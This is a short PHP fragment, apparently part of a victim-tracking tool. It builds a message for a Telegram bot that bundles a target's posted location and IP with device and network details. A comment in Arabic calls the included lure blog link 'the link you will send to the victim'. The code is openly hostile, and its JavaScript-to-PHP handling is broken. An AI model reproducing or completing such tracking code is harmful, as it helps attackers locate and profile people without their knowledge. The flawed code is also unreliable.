...
if(isset($_POST['location']) && isset($_POST['ip'])) {
    ...
    // Get the user's IP address and additional information using JavaScript
    $ipInfo = "<script src='ipinfo.js'></script>";

    // Set up the message to send to the Telegram bot with the additional information
    $message = "Location: $location\nIP: $ip\n\nIP Address: $ipInfo.ipAddress\nUser Agent: $ipInfo.userAgent\nPlatform: $ipInfo.platform\nScreen Width: $ipInfo.screenWidth\nScreen Height: $ipInfo.screenHeight\nCPU Cores: $ipInfo.cpuCores\nTotal RAM: $ipInfo.totalRAM\nVendor: $ipInfo.vendor\nIs Android: $ipInfo.isAndroid\nCountry: $ipInfo.country\nCity: $ipInfo.city\nISP: $ipInfo.isp\n\nهذا هو الرابط الي هتبعته للضحيه:\nhttps://sexylady2023.blogspot.com";
